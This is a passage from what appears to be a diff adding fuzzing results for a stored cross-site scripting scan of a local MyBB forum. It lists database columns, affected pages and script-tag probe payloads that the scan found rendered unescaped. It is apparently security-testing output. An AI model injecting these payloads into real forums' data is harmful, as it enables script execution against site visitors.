+	<dd>{$lang->forum_redirect}</dd>
+</dl>
+<br class=""clear"" />
+{$footer}
+</body>
+</html>' => '""'><script>xss(989457)</script>'
+            
+fuzzed after scan 196 / 302
+found as XSS in scan 197 / 302"
+mybb,mybb_forums.linkto,http://localhost/mybb/archive/index.php,989667,"""'><script>xss(989667)</script>","
+            mybb.mybb_forums.linkto[0][3]
+            original row: [1, 'My Category', '', '', 'c', 0, '1', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            fuzzed row: [1, 'My Category', '', '""\'><script>xss(989667)</script>', 'c', 0, '1', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            change: '' => '""'><script>xss(989667)</script>'
+            
+fuzzed after scan 26 / 302
+found as XSS in scan 27 / 302"
+mybb,mybb_forums.description,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top",990476,"""'><script>xss(990476)</script>","
+            mybb.mybb_forums.description[0][2]
+            original row: [1, 'My Category', '', '', 'c', 0, '1', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            fuzzed row: [1, 'My Category', '""\'><script>xss(990476)</script>', '', 'c', 0, '1', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            change: '' => '""'><script>xss(990476)</script>'
+            
+fuzzed after scan 25 / 302
+found as XSS in scan 26 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/online.php
+http://localhost/mybb/online.php#top
+http://localhost/mybb/online.php?sortby=location
+http://localhost/mybb/online.php?sortby=time
+http://localhost/mybb/online.php?sortby=username",991281,"""'><script>xss(991281)</script>","
+            mybb.mybb_templates.template[514][2]
+            original row: [515, 'online', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->users_online}</title>\n{$headerinclude}\n{$refresh}\n</head>\n<body>\n\t{$header}\n\t{$multipage}\n\t<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n\t\t<tr>\n\t\t\t<td class=""thead"" colspan=""3""><strong>{$lang->users_online}</strong></td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td class=""tcat"" align=""center""><a href=""online.php?sortby=username""><span class=""smalltext""><strong>{$lang->on_username}</strong></span></a></td>\n\t\t\t<td class=""tcat"" align=""center""><a href=""online.php?sortby=time""><span class=""smalltext""><strong>{$lang->time}</strong></span></a></td>\n\t\t\t<td class=""tcat"" width=""50%""><a href=""online.php?sortby=location""><span class=""smalltext""><strong>{$lang->location}</strong></span></a></td>\n\t\t</tr>\n\t\t{$online_rows}\n\t\t<tr>\n\t\t\t<td class=""tfoot"" colspan=""3"" align=""right""><span class=""smalltext""><strong><a href=""online.php?action=today"">{$lang->online_today}</a> | <a href=""online.php"">{$lang->refresh_page}</a></strong></span></td>\n\t\t</tr>\n\t</table>\n\t<br />\n\t{$multipage}\n\t{$footer}\n</body>\n</html>', -2, '1400', '', 1676537388]
+            fuzzed row: [515, 'online', '""\'><script>xss(991281)</script>', -2, '1400', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->users_online}</title>
+{$headerinclude}
+{$refresh}
+</head>
+<body>
+	{$header}
+	{$multipage}
+	<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+		<tr>
+			<td class=""thead"" colspan=""3""><strong>{$lang->users_online}</strong></td>
+		</tr>
+		<tr>
+			<td class=""tcat"" align=""center""><a href=""online.php?sortby=username""><span class=""smalltext""><strong>{$lang->on_username}</strong></span></a></td>
+			<td class=""tcat"" align=""center""><a href=""online.php?sortby=time""><span class=""smalltext""><strong>{$lang->time}</strong></span></a></td>
+			<td class=""tcat"" width=""50%""><a href=""online.php?sortby=location""><span class=""smalltext""><strong>{$lang->location}</strong></span></a></td>
+		</tr>
+		{$online_rows}
+		<tr>
+			<td class=""tfoot"" colspan=""3"" align=""right""><span class=""smalltext""><strong><a href=""online.php?action=today"">{$lang->online_today}</a> | <a href=""online.php"">{$lang->refresh_page}</a></strong></span></td>
+		</tr>
+	</table>
+	<br />
+	{$multipage}
+	{$footer}
+</body>
+</html>' => '""'><script>xss(991281)</script>'
+            
+fuzzed after scan 205 / 302
+found as XSS in scan 206 / 302"
